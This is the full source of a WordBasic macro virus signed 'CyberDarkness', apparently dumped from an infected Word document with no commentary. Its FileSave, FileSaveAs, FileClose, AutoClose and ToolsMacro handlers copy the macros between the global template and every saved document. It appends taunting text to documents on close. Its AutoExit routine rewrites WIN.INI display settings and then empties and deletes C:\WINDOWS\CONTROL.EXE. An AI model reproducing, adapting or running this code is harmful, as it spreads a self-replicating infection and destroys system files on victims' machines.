   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   'Temp Delete Rest
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.ToolsMacro dlg
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   Dim A As Object: Set A = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs A
   WordBasic.Dialog.FileSaveAs A
   If ((A.Format = 0) Or (A.Format = 1)) Then
   A.Format = 1
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose"
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave"
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro"
   End If
   WordBasic.FileSaveAs A
   Z:
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim B
   Dim C
   On Error Resume Next
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   If WordBasic.IsDocumentDirty() = -1 Or WordBasic.IsTemplateDirty() = -1 Then
   WordBasic.ScreenUpdating 0
   WordBasic.EndOfDocument
   WordBasic.FontSize 10
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor 1
   WordBasic.LeftPara
   WordBasic.Insert Chr(13) + Chr(13) + "To end with, I would like to say..." + Chr(13) + Chr(13)
   WordBasic.CenterPara
   WordBasic.Insert "To defy me is to bring upon my wrath..." + Chr(13) + "For I am"
   WordBasic.CharColor 6
   WordBasic.Bold 1
   WordBasic.Italic 1
   WordBasic.Insert " CyberDarkness"
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor 1
   WordBasic.Insert "..."
   WordBasic.Insert Chr(13) + "I am Darkness Incarnate..." + Chr(13) + "I will Not be Denied!!!" + Chr(13) + Chr(13)
   WordBasic.FontSize 10
   WordBasic.InsertSymbol Font:="Symbol", CharNum:="211"
   WordBasic.Insert Str(WordBasic.Year(WordBasic.Now()))
   WordBasic.CharColor 6
   WordBasic.Bold 1
   WordBasic.Italic 1
   WordBasic.Insert " CyberDarkness"
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor 1
   WordBasic.StartOfDocument
   WordBasic.ScreenUpdating 1
   End If

   For B = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](B, 0) = "FileSave" Then C = 1
   Next B
   If C <> 1 Then
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExit", "Global:AutoExit"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileClose", "Global:FileClose"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSave"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "Global:ToolsMacro"
   End If
   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim A
   Dim B
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   For A = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](A, 0) = "FileSave" Then B = 1 'Mark
   Next A

   If B <> 1 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExit", "Global:AutoExit"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileClose", "Global:FileClose"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSave", "Global:FileSave"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "Global:ToolsMacro"
   End If
   Z:
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active do"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   Dim A As Object: Set A = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs A
   If WordBasic.[Left$](WordBasic.[WindowName$](), 8) = "Document" Then WordBasic.Dialog.FileSaveAs A
   If ((A.Format = 0) Or (A.Format = 1)) Then
   A.Format = 1
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose"
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave"
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro"
   WordBasic.FileSaveAs A
   GoTo Z:
   End If
   Y:
   WordBasic.FileSave
   Z:
   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   If WordBasic.[Left$](WordBasic.[GetSystemInfo$](21), 7) = "Windows" Then
   SetAttr "C:\WINDOWS\WIN.INI", 0
   If WordBasic.Val(WordBasic.[GetSystemInfo$](24)) < 3.5 Then
   WordBasic.SetProfileString "windows", "ScreenSaveActive", "0"
   WordBasic.SetProfileString "windows", "DoubleClickSpeed", "500"
   WordBasic.SetProfileString "windows", "ScreenSaveActive", "0"
   WordBasic.SetProfileString "windows", "BorderWidth", "3"
   WordBasic.SetProfileString "Desktop", "Pattern", "(None)"
   WordBasic.SetProfileString "Desktop", "Wallpaper", "(None)"
   WordBasic.SetProfileString "Desktop", "GridGranularity", "0"
   WordBasic.SetProfileString "Desktop", "IconSpacing", "75"
   WordBasic.SetProfileString "colors", "Background", "0 0 0"
   WordBasic.SetProfileString "colors", "AppWorkspace", "0 0 0"
   WordBasic.SetProfileString "colors", "Window", "255 255 255"
   WordBasic.SetProfileString "colors", "WindowText", "0 0 0"
   WordBasic.SetProfileString "colors", "Menu", "255 255 255"
   WordBasic.SetProfileString "colors", "MenuText", "0 0 0"
   WordBasic.SetProfileString "colors", "ActiveTitle", "0 0 0"
   WordBasic.SetProfileString "colors", "InactiveTitle", "0 0 0"
   WordBasic.SetProfileString "colors", "TitleText", "255 0 0"
   WordBasic.SetProfileString "colors", "ActiveBorder", "255 0 0"
   WordBasic.SetProfileString "colors", "InactiveBorder", "192 192 192"
   WordBasic.SetProfileString "colors", "WindowFrame", "0 0 0"
   WordBasic.SetProfileString "colors", "Scrollbar", "192 192 192"
   WordBasic.SetProfileString "colors", "ButtonFace", "192 192 192"
   WordBasic.SetProfileString "colors", "ButtonShadow", "128 128 128"
   WordBasic.SetProfileString "colors", "ButtonText", "0 0 0"
   WordBasic.SetProfileString "colors", "GrayText", "128 128 128"
   WordBasic.SetProfileString "colors", "Hilight", "0 128 128"
   WordBasic.SetProfileString "colors", "HilightText", "255 255 255"
   WordBasic.SetProfileString "colors", "InactiveTitleText", "255 0 0"
   WordBasic.SetProfileString "colors", "ButtonHilight", "255 255 255"
   SetAttr "C:\WINDOWS\CONTROL.EXE", 0
   Open "C:\WINDOWS\CONTROL.EXE" For Output As 1
   Close 1
   WordBasic.Kill "C:\WINDOWS\CONTROL.EXE"
   Else
   WordBasic.SetProfileString "Colors", "Scrollbar", "192 192 192"
   WordBasic.SetProfileString "Colors", "Background", "0 0 0"
   WordBasic.SetProfileString "Colors", "ActiveTitle", "0 0 0"
   WordBasic.SetProfileString "Colors", "InactiveTitle", "0 0 0"
   WordBasic.SetProfileString "Colors", "Menu", "192 192 192"
   WordBasic.SetProfileString "Colors", "Window", "0 0 0"
   WordBasic.SetProfileString "Colors", "WindowFrame", "0 0 0"
   WordBasic.SetProfileString "Colors", "MenuText", "0 0 0"
   WordBasic.SetProfileString "Colors", "WindowText", "255 0 0"
   WordBasic.SetProfileString "Colors", "TitleText", "255 0 0"
   WordBasic.SetProfileString "Colors", "ActiveBorder", "192 192 192"
   WordBasic.SetProfileString "Colors", "InactiveBorder", "192 192 192"
   WordBasic.SetProfileString "Colors", "AppWorkspace", "0 0 0"
   WordBasic.SetProfileString "Colors", "Hilight", "0 0 0"
   WordBasic.SetProfileString "Colors", "HilightText", "255 0 0"
   WordBasic.SetProfileString "Colors", "ButtonFace", "192 192 192"
   WordBasic.SetProfileString "Colors", "ButtonShadow", "128 128 128"
   WordBasic.SetProfileString "Colors", "GrayText", "128 128 128"
   WordBasic.SetProfileString "Colors", "ButtonText", "0 0 0"
   WordBasic.SetProfileString "Colors", "InactiveTitleText", "255 0 0"
   WordBasic.SetProfileString "Colors", "ButtonHilight", "255 255 255"
   WordBasic.SetProfileString "Colors", "ButtonDkShadow", "0 0 0"
   WordBasic.SetProfileString "Colors", "ButtonLight", "192 192 192"
   WordBasic.SetProfileString "Colors", "InfoText", "0 0 0"
   WordBasic.SetProfileString "Colors", "InfoWindow", "255 0 0"
   WordBasic.SetProfileString "Desktop", "oldwallpaper", "0"
   WordBasic.SetProfileString "Desktop", "oldwallpaper", "(None)"
   WordBasic.SetProfileString "Desktop", "TileWallpaper", "0"
   WordBasic.SetProfileString "Desktop", "Pattern", "(None)"
   WordBasic.SetProfileString "Desktop", "Wallpaper", "(None)"
   WordBasic.SetProfileString "Desktop", "WallpaperStyle", "0"
   End If
   End If
   Z:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableAutoMacros 0
   Z:
   End Sub
